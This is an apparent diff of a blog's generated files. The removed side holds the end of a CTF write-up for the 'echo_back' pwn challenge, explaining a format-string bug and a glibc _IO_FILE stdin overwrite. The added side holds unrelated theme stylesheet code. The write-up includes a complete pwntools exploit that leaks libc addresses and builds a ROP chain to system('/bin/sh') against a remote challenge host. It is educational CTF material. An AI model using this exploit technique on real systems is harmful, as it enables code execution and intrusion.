0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// in `glibc-2.23\libio\stdio.h` --------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Standard streams.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdin</span>;</span>		<span class="comment">/* Standard input stream.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stdout</span>;</span>		<span class="comment">/* Standard output stream.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">stderr</span>;</span>		<span class="comment">/* Standard error output stream.  */</span></span><br><span class="line"><span class="comment">/* C89/C99 say they&#x27;re macros.  Make them happy.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stdin stdin</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stdout stdout</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stderr stderr</span></span><br></pre></td></tr></table></figure>
-<p>They are all file pointers, and in the file reading process it depends on <code>_IO_new_file_underflow</code> function to call the syscall <code>_IO_SYSREAD</code>. In file <code>glibc-2.23\libio\fileops.h</code>:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">... </span><br><span class="line"><span class="comment">// a limit</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">... </span><br><span class="line"><span class="comment">// action of `_IO_SYSREAD` is about `_IO_buf_base` and `_IO_buf_end`</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">... </span><br><span class="line"><span class="comment">// this helps to bypass first limit</span></span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">... </span><br><span class="line"><span class="comment">// till the end</span></span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>As <code>_IO_buf_base</code> and <code>_IO_buf_end</code> determine the action of <code>_IO_SYSREAD</code>, we can try to edit them to make it write wherever we want. Since we know the <code>libc base addr</code>, we can get where <code>stdin</code>(<code>_IO_2_1_stdin_</code>) is, therefore we can get where  <code>_IO_buf_base</code> and <code>_IO_buf_end</code> are:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx stdin</span><br><span class="line">_flags, _IO_read_ptr:           0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:        0x00000000fbad208b      0x00007ffff7dd1963</span><br><span class="line">_IO_read_end, _IO_read_base:    0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;:     0x00007ffff7dd1963      0x00007ffff7dd1963</span><br><span class="line">_IO_write_base, _IO_write_ptr:  0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;:     0x00007ffff7dd1963      0x00007ffff7dd1963</span><br><span class="line">_IO_write_end, _IO_buf_base:    0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;:     0x00007ffff7dd1963      0x00007ffff7dd1963</span><br><span class="line">_IO_buf_end, _IO_save_base:     0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;:     0x00007ffff7dd1964      0x0000000000000000</span><br><span class="line">_IO_backup_base, _IO_save_end:  0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;:     0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
-<p>Here we first enter <code>set_name()</code> and input the address of <code>_IO_buf_base</code> to let it appear on the stack, then use format string vuln in <code>echo_back()</code> to write only a <code>\x00</code> to its end. It stored <code>0x00007ffff7dd1963</code> before, after overwriting it becomes <code>0x00007ffff7dd1900</code> which points to <code>_IO_write_base</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p * stdin</span><br><span class="line">$3 = &#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_write_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt; &quot;&quot;, </span><br><span class="line">  _IO_buf_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Our aim is to edit <code>_IO_buf_base</code> but we better dont change the value in other places. So next we write from where <code>_IO_buf_base</code> points (<code>_IO_write_base</code> &#x3D; <code>_IO_2_1_stdin_+4*8</code>) to where <code>_IO_buf_end</code> points (probably<code>_IO_2_1_stdin_+132</code>). </p>
-<p>Recover the value of <code>_IO_write_base</code>, <code>_IO_write_ptr</code> and <code>_IO_write_end</code>, write <code>ret addr</code> of <code>main()</code> to <code>_IO_buf_base</code>, and leave enough room for payload when writing <code>_IO_buf_end</code>. </p>
-<p>After that we can write our payload directly to <code>ret addr</code> of <code>main()</code> when we next meet <code>scanf()</code>, but there is still a limit:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>
-<p>Though every <code>getchar()</code> gets  <code>_IO_read_ptr</code> plus <code>1</code>, there is:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_end += count;</span><br></pre></td></tr></table></figure>
-<p>So we have to run <code>len(payload)</code> times of <code>getchar()</code> to bypass this restriction. After the round in which we send payload,  <code>len(payload) - 1</code> rounds are needed.</p>
-<p>Finally we can write our payload. Exit to trigger it.</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Here it is:</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;echo_back&#x27;</span>)   <span class="comment"># local test</span></span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;36554&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;echo_back&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   <span class="comment"># local test</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span>(<span class="params">name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo_back</span>(<span class="params">sth, length=<span class="number">7</span></span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>, <span class="built_in">str</span>(length)) <span class="comment"># 7 is the max</span></span><br><span class="line">    sh.send(<span class="built_in">str</span>(sth))</span><br><span class="line"></span><br><span class="line">echo_back(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">libc_start_main_addr = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="comment"># leak __libc_start_main for libc base</span></span><br><span class="line">libc_addr = libc_start_main_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">IO_stdin_addr = libc_addr + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">IO_buf_base = IO_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line"><span class="comment"># leak main addr for elf base</span></span><br><span class="line">echo_back(<span class="string">&#x27;%13$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x9c</span> </span><br><span class="line">elf_base = main_addr - <span class="number">0x0c6c</span></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x0d93</span></span><br><span class="line"><span class="comment"># leak old rbp to get ret addr and overwrite</span></span><br><span class="line">echo_back(<span class="string">&#x27;%12$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">main_rbp = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">main_ret = main_rbp + <span class="number">0x8</span></span><br><span class="line"><span class="comment"># next attack `scanf`</span></span><br><span class="line"><span class="comment"># overwrite lowest digit as 0</span></span><br><span class="line">set_name(p64(IO_buf_base))</span><br><span class="line">echo_back(<span class="string">&#x27;%16$hhn&#x27;</span>)</span><br><span class="line"><span class="comment"># restore other values and change __IO_buf_base </span></span><br><span class="line">payload = p64(IO_stdin_addr + <span class="number">131</span>)*<span class="number">3</span> + p64(main_ret) + p64(main_ret+<span class="number">0x8</span>*<span class="number">3</span>) </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)     <span class="comment"># error if using &#x27;sendlineafter&#x27;     </span></span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)                     <span class="comment"># but the &#x27;\n&#x27; is needed</span></span><br><span class="line"><span class="comment"># to pass if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload)-<span class="number">1</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write final payload</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">final_payload = p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,final_payload) <span class="comment"># here a seperated &#x27;\n&#x27; is also suggested</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-        </div>
+  .article-header {
+    position: relative;
+    padding-left: $avatarWidth;
+    width: 100%;
+    height: $avatarWidth;
+    box-sizing: border-box;
 
-        
+    .avatar {
+      position: absolute;
+      top: 0
+      left: 0;
+      width: $avatarWidth;
+      height: $avatarWidth;
+      padding: 1px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
 
-        
-            <ul class="post-tags-box">
-                
-                    <li class="tag-item">
-                        <a href="/tags/pwn/">#pwn</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/linux/">#linux</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/io-file/">#io-file</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+      img {
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        background: var(--avatar-background-color);
+      }
 
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-Tcache/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (Tcache)</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2020/10/21/2020-10-21-Fuzz-with-Boofuzz-the-Successor-to-Sulley/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">Fuzz with Boofuzz (the Successor to Sulley)</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+    }
 
-        
-    </div>
-</div>
+
+    .info {
+      padding: 2px 0;
+      margin-left: 10px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      height: 100%;
+
+      .author {
+        font-weight: 600;
+        font-size: 1.18rem;
+        display: flex;
+        align-items: center;
+
+        .name {
+          color: var(--default-text-color);
+        }
+
+        .author-label {
+          margin-left: 10px;
+          font-size: 0.8rem;
+          font-weight: 500;
+          padding: 0 5px;
+          border-radius: 5px;
+          color: #fff;
+          background: var(--selection-color);
+        }
+
+      }
+    }
+
+  }
+
+
+  .article-header, .article-header-meta-info {
+    margin-top: 16px;
+    +keep-tablet() {
+      transform: scale(0.9);
+      transform-origin: left top;
+    }
+  }
+
+
+  .article-content {
+    margin-top: $component-spacing-value;
+    padding-bottom: 10px;
+    word-wrap: break-word;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--default-text-color);
+  }
+
+
+  .post-tags-box {
+    display: none;
+    margin-top: 1.6rem;
+    justify-content: center;
+    font-size: 1.1rem;
+
+    +keep-tablet() {
+      display: flex;
+    }
+
+    +keep-mobile() {
+      margin-top: 1.2rem;
+      font-size: 1rem;
+    }
+
+
+    .tag-item {
+      margin: 0 0.25rem;
+    }
+  }
+
+  .post-copyright-info {
+    margin-top: $component-spacing-value;
+    width: 100%;
+
+    +keep-tablet() {
+      margin-top: $component-spacing-value * 0.8;
+    }
+  }
+
+
+  .article-nav {
+    height: 40px;
+    margin-top: $component-spacing-value;
+
+    .article-prev, .article-next {
+      max-width: $post-nav-max-width;
+      height: 100%;
+      box-sizing: border-box;
+
+      keep-container(true, 1.03, 1.03, 10px, 0);
+
+      a {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 100%;
+        box-sizing: border-box;
+
+        &.prev {
+          padding-left: $arrow-icon-width;
+        }
+
+        &.next {
+          padding-right: $arrow-icon-width;
+        }
+
+        .arrow-icon {
+          position: absolute;
+          top: 0;
+          height: 100%;
+          width: $arrow-icon-width;
+
+          &.left {
+            left: 0;
+          }
+
+          &.right {
+            right: 0;
+          }
+        }
+
+        .title {
+          width: 100%;
+          height: 100%;
+        }
+      }
+
+    }
+
+    .article-prev {
+      float: left;
+    }
+
+    .article-next {
+      float: right;
+    }
+
+    .post-nav-item {
+      display: none;
+
+      +keep-tablet() {
+        display: inline-block;
+      }
+
+    }
+
+
+    .post-nav-title-item {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+
+      +keep-tablet() {
+        display: none;
+      }
+    }
+
+  }
+
+
+}
+
 
 
                 
@@ -463,11 +475,80 @@
 
     
         <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#echo-back"><span class="nav-number">1.</span> <span class="nav-text">echo_back</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
-    </div>
-</div>
+            .post-toc-wrap {
+  width: 100%;
+  font-size: 0.92rem;
+  box-sizing: border-box;
+
+  .post-toc {
+
+    ol {
+      list-style: none;
+      margin: 0;
+      padding: 0 2px 12px 10px;
+      text-align: left;
+
+      &:last-child {
+        padding-bottom: 0;
+      }
+
+      > ol {
+        padding-left: 0;
+      }
+
+      a {
+        transition-property: all;
+        transition();
+      }
+    }
+
+
+    .nav-item {
+      line-height: 1.8;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+
+    .nav {
+      .nav-child {
+        display: hexo-config('toc.expand_all') ? block : none;
+      }
+
+      .active > .nav-child {
+        display: block;
+      }
+
+      .active-current > .nav-child {
+        display: block;
+
+        > .nav-item {
+          display: block;
+        }
+      }
+
+
+      .nav-number, .nav-text {
+        color: var(--default-text-color);
+      }
+
+      .active > a {
+        .nav-number, .nav-text {
+          color: var(--primary-color);
+        }
+      }
+
+      .active-current > a {
+        .nav-number, .nav-text {
+          color: var(--primary-color);
+        }
+      }
+    }
+  }
+}
+
+
         </aside>
     
 
